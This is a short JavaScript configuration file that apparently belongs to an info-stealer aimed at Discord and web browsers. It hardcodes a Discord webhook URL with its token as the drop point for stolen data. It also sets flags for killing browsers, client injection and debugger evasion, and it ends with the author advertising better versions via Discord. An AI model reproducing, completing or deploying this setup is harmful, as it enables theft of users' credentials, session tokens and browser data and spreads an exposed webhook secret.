require("dotenv").config();
const process = require("process");

module.exports = function getconfig() {
    return {
        "webhook": process.env.WEBHOOK || "https://discord.com/api/webhooks/1194647161565102120/-rlCBID5UaWfQMkKu-LUHK-zGDiPlY7-sSmGu9FbMc3dFDPKLk8u2QA7or77tHxkBBoG",
        "kill":{ 
            "discords": false,
            "browsers": true,
        }, 
        "debugger": true, 
        "injection": true, 
    }
}
// if you want something better, you can contact me, DIsocrd: k4itrunnnssh